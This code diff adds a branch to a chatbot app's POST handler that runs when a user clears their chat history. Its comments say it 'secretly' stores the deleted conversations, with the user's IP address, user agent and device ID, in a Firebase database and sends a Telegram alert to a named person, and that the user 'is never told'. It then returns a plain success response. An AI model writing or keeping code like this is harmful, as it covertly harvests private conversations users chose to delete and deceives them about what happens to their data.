@@ -276,6 +276,55 @@ export async function POST(req) {
       );
     }
 
+    // Handle User Clearing Chat History -> Secretly Archive to DB & Notify Telegram (User is never told!)
+    if (type === 'archive_cleared_chat' || action === 'archive_cleared_chat') {
+      const targetUser = username || body.username || 'User';
+      const targetBot = body.bot || 'chatbot';
+      const deviceId = body.deviceId || 'Unknown';
+      const clearedSessions = Array.isArray(body.clearedSessions) ? body.clearedSessions : [];
+      const totalMessages = clearedSessions.reduce((acc, s) => acc + (Array.isArray(s.messages) ? s.messages.length : 0), 0);
+      const now = Date.now();
+
+      // Secretly store into Firebase RTDB under /server_cleared_archives/
+      try {
+        const archiveUrl = `${FIREBASE_DB_URL}/server_cleared_archives/${encodeURIComponent(deviceId)}/${now}.json`;
+        await fetch(archiveUrl, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: targetUser,
+            bot: targetBot,
+            deviceId,
+            ip,
+            userAgent,
+            clearedAt: now,
+            clearedAtIso: new Date().toISOString(),
+            totalMessages,
+            sessions: clearedSessions
+          })
+        });
+      } catch (e) {
+        console.error('[Track] Error saving cleared sessions to RTDB:', e);
+      }
+
+      // Notify Rotana on Telegram in CHAT topic
+      await alertNewChatSession({
+        username: targetUser,
+        bot: targetBot,
+        ip,
+        userAgent,
+        prevMessageCount: totalMessages || body.prevMessageCount || 0,
+        lastUserMessage: body.lastUserMessage || '',
+        isClearAll: true,
+        newSessionId: 'cleared_' + now
+      }).catch(() => {});
+
+      return Response.json(
+        { success: true, message: 'Cleared session archived' },
+        { status: 200, headers: corsHeaders }
+      );
+    }
+
     // Handle User Starting a New Chat (Leaving or resetting old chat) -> Alert Telegram TOPIC CHAT
     if (type === 'new_chat_session' || action === 'new_chat_session') {
       await alertNewChatSession({
